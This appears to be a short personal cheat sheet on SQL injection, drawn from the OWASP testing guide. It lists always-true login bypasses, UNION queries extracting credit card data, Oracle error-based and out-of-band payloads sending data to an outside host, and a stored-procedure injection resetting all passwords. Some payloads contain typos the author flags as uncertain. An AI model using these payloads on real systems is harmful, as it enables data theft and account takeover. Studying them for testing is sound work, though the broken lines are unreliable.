# SQL Injection

## Standard Exploitation

* Add an always true condition :
  * `1' or '1' = '1`
  * `1' or 1 = 1 #` \(comment instead of closing the string\)

```sql
# Transform this request : 
SELECT * FROM Users WHERE Username=’$username’ AND Password=’$password’

# To that : 
SELECT * FROM Users WHERE Username=’admin’ AND Password=’1’ OR ‘1’ = ‘1’
```

* Use `LIMIT` if needed
* Stack request by terminating it with `;`

## Union Exploitation

* Extend a `SELECT` request with an `UNION`

```sql
# Tansform this request :
SELECT Name, Phone, Address FROM Users WHERE Id=$id

# To that :
SELECT Name, Phone, Address FROM Users WHERE Id=1 UNION ALL SELECT creditCardNumber,1,1 FROM CreditCardTable
```

* The select of your union needs to have the same number of columns as the initial select, and of the same type
  * To guess the right number of columns, use `ORDER BY <nb>` \(if it returns a result instead of an error, it's the right number\)
  * To guess the type, start with `NULL` and check the error message
* `ALL` is used against `DISTINCT`
* If only the first result is shown \(aka, the one from the initial request\), give an invalid id so that it's the result of the union which will be use

## Error Based Exploitation

* With oracle, use this type of payload :

```sql
|| UTL_INADDR. GET_HOST_NAME((SELECT user FROM DUAL)) --
```

* It'll return : `ORA-292257: host SCOTT unknown`, revealing the user

{% hint style="info" %}
Check the syntax for other DBMS
{% endhint %}

## Out of band exploitation

* With Oracle

```sql
|| UTL_HTTP. request(‘testerserver.com:80’ || (SELET user FROM DUAL) --
```

{% hint style="info" %}
* Isn't a `)` missing ?
* Check the syntax for other DBMS
{% endhint %}

## Stored Procedure Injection

* This type of syntax exist

```sql
Create procedure get_report @columnamelist varchar(7900) As Declare @sqlstring varchar(8000) Set @sqlstring = ‘ Select ‘ + @ columnamelist + ‘ from ReportTable‘ exec(@sqlstring) Go
```

* Which we can abuse with  :`1 from users; update users set password = ‘password’; select *`
* But i don't know this syntax so i don't know how it works

## Insider Info

If you have an injection in a place where doing an `1'or '1'='1` isn't useful, you may still be able to use it to show the table name & structure by injecting an sql command.

## Sources

* [Owasp testing guide v4](https://owasp.org/www-project-web-security-testing-guide/assets/archive/OWASP_Testing_Guide_v4.pdf)
* Misc research

